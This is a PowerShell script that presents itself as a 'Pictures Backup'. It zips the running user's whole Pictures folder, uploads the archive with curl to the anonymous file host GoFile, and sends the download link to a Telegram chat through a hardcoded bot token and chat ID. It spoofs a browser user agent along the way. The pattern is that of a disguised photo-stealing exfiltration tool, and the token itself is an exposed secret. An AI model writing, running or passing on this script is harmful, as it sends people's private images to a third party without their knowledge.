# ========================================
#            CONFIGURATION
# ========================================
# FORCE TLS 1.2 (Fixes "API Down" errors)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$BotToken       = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
$ChatId         = "2146236602"

# Folder to zip (Uses current user profile)
$PicturesFolder = "$env:USERPROFILE\Pictures" 
$ZipFile        = "$env:TEMP\Pictures_Backup.zip"
# ========================================

Write-Host "--- STARTED BACKUP PROCESS ---" -ForegroundColor Magenta

# 1. ZIP THE FOLDER
Write-Host "[1/4] Zipping pictures folder..." -ForegroundColor Cyan
try {
    if (Test-Path $ZipFile) { Remove-Item $ZipFile -Force }
    Compress-Archive -Path "$PicturesFolder\*" -DestinationPath $ZipFile -Force -ErrorAction Stop
    Write-Host "      Zip created successfully." -ForegroundColor Green
}
catch {
    Write-Host "[-] ZIP creation failed: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host "Press Enter to stop..."
    return
}

# 2. GET GOFILE SERVER
Write-Host "[2/4] Getting GoFile server..." -ForegroundColor Cyan
try {
    # Added UserAgent to avoid being blocked as a bot
    $serverInfo = Invoke-RestMethod "https://api.gofile.io/getServer" -UserAgent "Mozilla/5.0" -ErrorAction Stop
    $server = $serverInfo.data.server
    if (-not $server) { throw "Server data is empty" }
}
catch {
    # Print the ACTUAL error message
    Write-Host "[-] Failed to get GoFile server: $($_.Exception.Message)" -ForegroundColor Red
    Read-Host "Press Enter to stop..."
    return
}

# 3. UPLOAD ZIP (Using Curl)
Write-Host "[3/4] Uploading to server ($server)..." -ForegroundColor Cyan
if (-not (Test-Path "$env:SystemRoot\System32\curl.exe")) {
    Write-Host "[-] Curl.exe not found." -ForegroundColor Red
    Read-Host "Press Enter to stop..."
    return
}

$curlOutput = & "$env:SystemRoot\System32\curl.exe" -s -F "file=@$ZipFile" "https://$server.gofile.io/uploadFile"

try {
    $result = $curlOutput -join "`n" | ConvertFrom-Json
    if ($result.status -ne "ok") { throw "Status not OK" }
    $DownloadLink = $result.data.downloadPage
    Write-Host "      Upload successful!" -ForegroundColor Green
    Write-Host "      Link: $DownloadLink" -ForegroundColor Yellow
}
catch {
    Write-Host "[-] Upload failed." -ForegroundColor Red
    Write-Host "Debug Info: $curlOutput" -ForegroundColor Gray
    Remove-Item $ZipFile -Force
    Read-Host "Press Enter to stop..."
    return
}

# 4. SEND TO TELEGRAM & DELETE ZIP
Write-Host "[4/4] Sending link to Telegram..." -ForegroundColor Cyan
try {
    $msgText = "ðŸ“¸ *Pictures Backup Complete*`n`nLink: $DownloadLink"
    
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
        -Method Post `
        -Body @{
            chat_id    = $ChatId
            text       = $msgText
            parse_mode = "Markdown"
        } -ErrorAction Stop
        
    Write-Host "      Notification sent." -ForegroundColor Green

    # DELETE ZIP AFTER SUCCESS
    Remove-Item $ZipFile -Force -ErrorAction SilentlyContinue
}
catch {
    Write-Host "[-] Failed to send Telegram message: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "`n[âœ“] All Done." -ForegroundColor Green
Read-Host "Press Enter to close..."
